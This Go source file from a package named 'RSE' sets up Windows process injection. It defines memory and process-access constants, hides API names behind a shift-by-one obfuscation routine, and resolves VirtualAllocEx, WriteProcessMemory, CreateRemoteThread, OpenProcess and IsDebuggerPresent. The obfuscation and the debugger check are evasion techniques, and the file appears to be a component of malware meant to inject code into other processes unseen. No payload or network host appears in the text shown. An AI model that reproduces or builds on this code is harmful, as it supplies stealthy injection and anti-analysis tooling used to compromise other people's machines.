package RSE


import "syscall"


const MEM_COMMIT  = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010


func DeObfuscate(Data string) (string){
	var ClearText string
	for i := 0; i < len(Data); i++ {
		ClearText += string(int(Data[i])-1)
	}
	return ClearText
}

var	K32 = syscall.MustLoadDLL(DeObfuscate("lfsofm43/emm"))//kernel32.dll
var USER32 = syscall.MustLoadDLL(DeObfuscate("vtfs43/emm"))//user32.dll
var VirtualAllocEx = K32.MustFindProc(DeObfuscate("WjsuvbmBmmpdF"))//VirtualAllocEx
var CreateRemoteThread = K32.MustFindProc(DeObfuscate("DsfbufSfnpufUisfbe"))//CreateRemoteThread
var WriteProcessMemory = K32.MustFindProc(DeObfuscate("XsjufQspdfttNfnpsz"))//WriteProcessMemory
var OpenProcess = K32.MustFindProc(DeObfuscate("PqfoQspdftt"))//OpenProcess
var IsDebuggerPresent = K32.MustFindProc(DeObfuscate("JtEfcvhhfsQsftfou"))
